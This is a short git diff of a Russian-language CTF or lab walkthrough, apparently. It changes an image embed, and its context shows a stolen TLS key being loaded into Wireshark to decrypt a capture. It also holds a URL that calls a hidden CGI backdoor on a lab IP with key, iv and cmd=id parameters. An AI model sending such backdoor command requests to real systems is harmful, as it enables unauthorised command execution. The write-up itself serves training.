@@ -357,7 +357,8 @@ sftp> get apache.key  Fetching /etc/apache2/certs/apache.key to apache.key apach
 
 Теперь мы можем добавить наш **apache.key** в лог **capture.pcap** и посмотреть содержимое пакетов. Edit > Preferences > Protocols > TLS и добавляем **apache.key**. 
 
-![[Pasted image 20260104222023.png]]
+<img width="1470" height="786" alt="Pasted image 20260104222023" src="https://github.com/user-attachments/assets/71129b2b-fdf5-44f4-9b71-f2e30e507b7d" />
+
 ```
 https://10.64.181.102:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id
 ```
